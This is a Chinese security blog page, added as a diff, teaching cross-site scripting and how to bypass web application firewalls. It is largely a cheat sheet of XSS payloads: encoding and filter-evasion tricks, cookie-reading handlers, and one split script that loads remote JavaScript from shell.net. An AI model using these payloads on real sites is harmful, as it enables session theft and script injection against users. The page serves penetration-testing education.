@@ -1,0 +1,1127 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="什么是XSS漏洞XSS全称跨站脚本(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故缩写为XSS，比较合适的方式应该叫做跨站脚本攻击。 跨站脚本攻击是一种常见的web安全漏洞，它主要是指攻击者可以在页面中插入恶意脚本代码，当受害者访问这些页面时，浏览器会解析并执行这些恶意代码，从而达到窃取用户身份/钓鱼/传播恶">
+<meta name="keywords" content="xss">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BypassWaf_xss">
+<meta property="og:url" content="https://wh0ale.github.io/2018/12/30/2018-12-30-BypassWaf_xss/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="什么是XSS漏洞XSS全称跨站脚本(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故缩写为XSS，比较合适的方式应该叫做跨站脚本攻击。 跨站脚本攻击是一种常见的web安全漏洞，它主要是指攻击者可以在页面中插入恶意脚本代码，当受害者访问这些页面时，浏览器会解析并执行这些恶意代码，从而达到窃取用户身份/钓鱼/传播恶">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyp4d6xll2j20ye0dy403.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fys1velc7qj210y0w6acr.jpg">
+<meta property="og:image" content="https://www.websec.ca/img/three-non-web-based-xss-injections/symantec.png">
+<meta property="og:image" content="https://www.websec.ca/img/three-non-web-based-xss-injections/symantec-xss.png">
+<meta property="og:image" content="https://www.websec.ca/img/three-non-web-based-xss-injections/rats.png">
+<meta property="og:image" content="https://www.websec.ca/img/three-non-web-based-xss-injections/rats-xss.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fypr96reo5j20jc07ojst.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fypreygzbrj20lz0a1dmd.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyprfv1be7j20re0lcmyx.jpg">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t016761eb473b221e42.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyprjod9cbj21e6076n0h.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyprkntdnjj21900h2jsr.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyprlccny8j2178182k0b.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyprly0fcwj21b012en16.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fypro47h7hj20w211o0vi.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyprovnhvtj20nq0vm75o.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyprpnzlqij21020eaab5.jpg">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t01c56b570a1f671daa.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyprrfqsanj20qg0kut9v.jpg">
+<meta property="og:image" content="https://p0.ssl.qhimg.com/t016b256ff57a040832.png">
+<meta property="og:image" content="https://p2.ssl.qhimg.com/t01584c35dc674b052a.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2f87r87wj20l607o0vf.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2fcazc3bj20qy0ezwiv.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2fe0qt0gj20r00d6djd.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2flkrd5pj20hm0b9ace.jpg">
+<meta property="og:updated_time" content="2019-12-03T06:17:19.140Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="BypassWaf_xss">
+<meta name="twitter:description" content="什么是XSS漏洞XSS全称跨站脚本(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故缩写为XSS，比较合适的方式应该叫做跨站脚本攻击。 跨站脚本攻击是一种常见的web安全漏洞，它主要是指攻击者可以在页面中插入恶意脚本代码，当受害者访问这些页面时，浏览器会解析并执行这些恶意代码，从而达到窃取用户身份/钓鱼/传播恶">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyp4d6xll2j20ye0dy403.jpg">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2018/12/30/2018-12-30-BypassWaf_xss/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>BypassWaf_xss | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2018/12/30/2018-12-30-BypassWaf_xss/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">BypassWaf_xss
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-12-30 00:00:00" itemprop="dateCreated datePublished" datetime="2018-12-30T00:00:00+08:00">2018-12-30</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-12-03 14:17:19" itemprop="dateModified" datetime="2019-12-03T14:17:19+08:00">2019-12-03</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">13k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">11 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyp4d6xll2j20ye0dy403.jpg" alt></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fys1velc7qj210y0w6acr.jpg" alt></p>
+<h1 id="什么是XSS漏洞"><a href="#什么是XSS漏洞" class="headerlink" title="什么是XSS漏洞"></a>什么是XSS漏洞</h1><p>XSS全称跨站脚本(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故缩写为XSS，比较合适的方式应该叫做跨站脚本攻击。</p>
+<p>跨站脚本攻击是一种常见的web安全漏洞，它主要是指攻击者可以在页面中插入恶意脚本代码，当受害者访问这些页面时，浏览器会解析并执行这些恶意代码，从而达到窃取用户身份/钓鱼/传播恶意代码等行为。</p>
+<h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><blockquote>
+<p>反射型（非持久型）<br>存储型（持久型）<br>DOM型<br>不常见的XSS:<br>mXSS 突变型XSS<br>UXSS 通用型XSS<br>Flash XSS<br>UTF-7 XSS<br>MHTML XSS<br>CSS XSS<br>VBScript XSS</p>
+</blockquote>
+<p><strong>存储型</strong></p>
+<p>存储型XSS也叫持久型XSS，存储的意思就是Payload是有经过存储的，当一个页面存在存储型XSS的时候，XSS注入成功后，那么每次访问该页面都将触发XSS。</p>
+<p><strong>反射型</strong></p>
+<p>反射型XSS也叫非持久型XSS，最常见的是Payload是构造在网址的某个GET参数的值里。</p>
+<p><strong>DOM 型</strong></p>
+<p>基于DOM的XSS有时也称为type0XSS。当用户能够通过交互修改浏览器页面中的DOM(DocumentObjectModel)并显示在浏览器上时，就有可能产生这种漏洞，从效果上来说它也是反射型XSS。通过修改页面的DOM节点形成的XSS，称之为DOMBasedXSS。</p>
+<h2 id="xss-bypass"><a href="#xss-bypass" class="headerlink" title="xss bypass"></a>xss bypass</h2><h3 id="检测过滤情况"><a href="#检测过滤情况" class="headerlink" title="检测过滤情况"></a>检测过滤情况</h3><p>用于有字符限制的短探测器<br> <code>&#39;&#39;;!--&quot;&lt;XSS&gt;=&amp;{()}</code><br> 完全版探测器<br> <code>&#39;;alert(String.fromCharCode(88,83,83))//&#39;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&#39;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</code></p>
+<h3 id="观察输出位置"><a href="#观察输出位置" class="headerlink" title="观察输出位置"></a>观察输出位置</h3><h4 id="标签之间"><a href="#标签之间" class="headerlink" title="标签之间"></a>标签之间</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">模型： &lt;div&gt;[xss]&lt;/div&gt; payload： &lt;script&gt;alert(1)&lt;/script&gt;或者&lt;img src=1 onerror=alert(1)&gt;</span><br><span class="line">这些标签有：</span><br><span class="line">&lt;a&gt; &lt;p&gt; &lt;img&gt; &lt;body&gt; &lt;button&gt; &lt;var&gt; &lt;div&gt; &lt;object&gt; &lt;input&gt; &lt;select&gt; &lt;keygen&gt; &lt;frameset&gt;  &lt;embed&gt; &lt;svg&gt; &lt;video&gt; &lt;audio&gt;</span><br><span class="line"></span><br><span class="line">自带HtmlEncode（转义）功能的标签(RCDATA)，这是插入的javascript不会被执行，除非我们闭合掉它们。</span><br><span class="line">&lt;textarea&gt;&lt;/textarea&gt; &lt;title&gt;&lt;/title&gt; &lt;iframe&gt;&lt;/iframe&gt; &lt;noscript&gt;&lt;/noscript&gt; &lt;noframes&gt;&lt;/noframes&gt; &lt;xmp&gt;&lt;/xmp&gt; &lt;plaintext&gt;&lt;/plaintext&gt; 其他：&lt;math&gt;&lt;/math&gt;也不行</span><br></pre></td></tr></table></figure>
+
+<h4 id="js标签之间"><a href="#js标签之间" class="headerlink" title="js标签之间"></a>js标签之间</h4><p>在该位置，空格被过滤，可用/**/代替空格。输出在注释中，通过换行符%0a %0d使其逃逸出来。</p>
+<h5 id="不在字符串内"><a href="#不在字符串内" class="headerlink" title="不在字符串内"></a>不在字符串内</h5><p>判断&lt;&gt;/是否被过滤。如果没有，那么直接插入就可以。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">[output]</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">payload：&lt;/</span>script&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<h5 id="在字符串中"><a href="#在字符串中" class="headerlink" title="在字符串中"></a>在字符串中</h5><p>此时需要闭合字符串，并保证插入的JS代码符合语法规范。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">Var x=&quot;Input&quot;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p> input是输出点，我们首先要闭合双引号，才能保证XSS成功。如果我们无法闭合包括字符串的引号（引号被转义），就很难利用，除非存在两个输出点或宽字节。(详见参考资料)</p>
+<h4 id="输出在HTML属性内"><a href="#输出在HTML属性内" class="headerlink" title="输出在HTML属性内"></a>输出在HTML属性内</h4><h5 id="文本属性中"><a href="#文本属性中" class="headerlink" title="文本属性中"></a>文本属性中</h5><p>例如：<code>&lt;input value=&quot;输出&quot;&gt; 、 &lt;img onload=&quot;...[输出]...&quot;&gt; ，再比如 &lt;body style=&quot;...[输出]...&quot;&gt;</code></p>
+<p><strong>无引号包裹，直接添加新的事件属性。</strong></p>
+<p><strong>有引号包括。首先测试引号是否可用，可用则闭合属性之后添加新的事件属性。</strong></p>
+<blockquote>
+<p>HTML的属性，如果被进行HTML实体编码(形如&#39;&amp;#x27)，那么HTML会对其进行自动解码，从而我们可以在属性里以HTML实体编码的方式引入任意字符，从而方便我们在事件属性里以JS的方式构造payload。当然，也可以闭合属性后，然后再执行脚本。</p>
+</blockquote>
+<h5 id="src-href-action-xlink-href-autofocus-content-data-等属性"><a href="#src-href-action-xlink-href-autofocus-content-data-等属性" class="headerlink" title="src/href/action/xlink:href/autofocus/content/data 等属性"></a>src/href/action/xlink:href/autofocus/content/data 等属性</h5><p>直接使用伪协议绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">javascript 伪协议： &lt;a href=javascript:alert(2)&gt;test&lt;/a&gt;</span><br><span class="line">data 协议执行 javascript： &lt;a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg==&gt;test&lt;/a&gt;(Chrome被拦截，Firefox可以)</span><br><span class="line">urlencode 版本： &lt;a href=data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E&gt;(测试未通过)</span><br><span class="line">不使用 href 的另外一种组合来执行 js： &lt;svg&gt;&lt;a xlink:href=&quot;javascript:alert(14)&quot;&gt;&lt;rect width=&quot;1000&quot; height=&quot;1000&quot; fill=&quot;white&quot;/&gt;&lt;/a&gt;&lt;/svg&gt;（均可） 或者：</span><br><span class="line">&lt;math&gt;&lt;a xlink:href=javascript:alert(1)&gt;1&lt;/a&gt;&lt;/math&gt;(Chrome不可，Firefox可以)</span><br></pre></td></tr></table></figure>
+
+<h5 id="on-事件中"><a href="#on-事件中" class="headerlink" title="on*事件中"></a>on*事件中</h5><p> 插入合乎逻辑的JS代码即可。也可以使用伪协议。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">onload</span><br><span class="line">onclick</span><br><span class="line">onunload</span><br><span class="line">onchange</span><br><span class="line">onsubmit</span><br><span class="line">onreset</span><br><span class="line">onselect</span><br><span class="line">onblur</span><br><span class="line">onfocus</span><br><span class="line">onabort</span><br><span class="line">onkeydown</span><br><span class="line">onkeypress</span><br><span class="line">onkeyup</span><br><span class="line">ondbclick</span><br><span class="line">onmouseover</span><br><span class="line">onmousemove</span><br><span class="line">onmouseout</span><br><span class="line">onmouseup</span><br><span class="line">onforminput</span><br><span class="line">onformchange</span><br><span class="line">ondrag</span><br><span class="line">ondrop</span><br></pre></td></tr></table></figure>
+
+<h3 id="绕过waf"><a href="#绕过waf" class="headerlink" title="绕过waf"></a>绕过waf</h3><p><strong>单次过滤规则绕过：</strong><code>&lt;scr&lt;script&gt;ipt&gt;</code><br><strong>大小写绕过：</strong><script><br><strong>alert绕过：</strong>可以尝试prompt和confirm<br><strong>没有斜杠：</strong><code>&lt;IMG SRC=javascript:alert(&#39;XSS&#39;)&gt;</code><br><strong>空格被过滤：</strong><code>&lt;img/src=&quot;&quot;onerror=alert(2)&gt;</code> <code>&lt;svg/onload=alert(2)&gt;&lt;/svg&gt;</code><br><strong>长度限制时：</strong><br> (1)<code>&lt;q/oncut=alert(1)&gt;</code><br> (2)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;z=’document.’&lt;/script&gt; &lt;script&gt;z=z+’write(“‘&lt;/script&gt; &lt;script&gt;z=z+’&lt;script’&lt;/script&gt; &lt;script&gt;z=z+’ src=ht’&lt;/script&gt; &lt;script&gt;z=z+’tp://ww’&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+’w.shell’&lt;/script&gt; &lt;script&gt;z=z+’.net/1.’&lt;/script&gt; &lt;script&gt;z=z+’js&gt;&lt;/sc’&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+’ript&gt;”)’&lt;/script&gt; &lt;script&gt;eval_r(z)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>单引号及双引号被过滤情况：<code>&lt;script&gt;alert(/jdq/)&lt;/script&gt; //用双引号会把引号内的内容单独作为内容 用斜杠，则会连斜杠一起回显</code><br> <strong>javascript伪协议：</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"javascript:alert(/test/)"</span>&gt;xss&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp">&lt;iframe src=javascript:alert('xss');height=0 width=0 /</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">iframe</span>&gt;</span>利用iframe框架标签</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>畸形payload：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>括号被过滤,可以使用throw来抛出数据</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a onmouseover=<span class="string">"javascript:window.onerror=alert;throw 1"</span>&gt;<span class="number">2</span>&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp">&lt;img src=x onerror="javascript:window.onerror=alert;throw 1"&gt;</span></span><br><span class="line"><span class="regexp">&lt;body/</span>onload=javascript:<span class="built_in">window</span>.onerror=<span class="built_in">eval</span>;<span class="keyword">throw</span><span class="string">'=alert\x281\x29'</span>;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>当=();:被过滤时：</strong></p>
+<p>过滤某些关键字（如：javascript） 可以在属性中的引号内容中使用空字符、空格、TAB换行、注释、特殊的函数，将代码行隔开。比如在使用<iframe src="javascript:alert(1253)" height=0 width=0 /><iframe>时，可以用回车、Tab键将src中的内容隔开，回车的url编码为%0a,%0b;</p>
+<p> <strong>拼凑法：</strong>① 双写绕过；② 使用js定义变量z=scri, z+pt=script; ③ 两处输出点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scri&lt;!-- 第二处--&gt;pt&gt;;</span><br></pre></td></tr></table></figure>
+
+<p>无法使用href：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a onmouseover=<span class="string">"alert(document.cookie)"</span>&gt;xxs link&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp">在chrome下，其回补全缺失的引号。因此，也可以这样写：</span></span><br><span class="line"><span class="regexp">&lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/</span>a&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><p>JS函数（如eval，settimeout）还有就是<code>href= action= formaction= location= on*= name= background= poster= src= code=</code>这些地方，可以配合编码。此外，data属性可以base64编码。<br> 1.js16进制</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">eval</span>(“js+<span class="number">16</span>进制加密”)&lt;<span class="regexp">/script&gt; &lt;script&gt;eval("\x61\x6c\x65\x72\x74\x28\x22\x78\x73\x73\x22\x29")&lt;/</span>script&gt; 编码要执行的语句↓</span><br><span class="line">Alert(“xss”)</span><br></pre></td></tr></table></figure>
+
+<p>2.js unicode</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">eval</span>(<span class="string">"unicode加密"</span>)&lt;<span class="regexp">/script&gt; /</span><span class="regexp">/js unicode加密 解决alert()被过滤</span></span><br><span class="line"><span class="regexp">&lt;script&gt;eval("\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029")&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>3.String.fromCharCode函数（不需要任何引号，必须函数内）</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">eval</span>(<span class="built_in">String</span>.fromCharCode编码内容))&lt;<span class="regexp">/script&gt; &lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,13))&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>4.jsfuck版本</p>
